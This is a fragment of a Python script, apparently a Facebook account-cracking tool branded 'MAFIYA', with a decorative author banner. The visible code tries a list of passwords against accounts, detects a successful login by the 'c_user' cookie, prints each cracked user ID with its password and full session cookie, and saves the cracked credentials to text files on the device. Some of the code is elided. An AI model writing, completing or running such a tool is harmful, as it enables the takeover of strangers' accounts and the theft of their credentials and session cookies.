...
\033[0;93m
╔══════════════════════════════════════════╗🖤"
║Author   : 𝐌𝐑. 𝐌𝐀𝐅𝐈𝐘𝐀 𝐗 𝐓𝐎𝐌
║YouTube   : 𝐌𝐀𝐅𝐈𝐘𝐀 𝐇𝐔𝐍𝐓𝐄𝐑
║Facebook : 𝐘𝐎𝐔𝐑 𝐏𝐀𝐏𝐀  𝐇𝐄𝐑𝐄 
║Version  : 4.0.1                       
╚══════════════════════════════════════════╝💔"\033[1;31m
    """) 
loop = 0
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[MAFIYA-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/MAFIYA-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/MAFIYA-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}MAFIYA{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
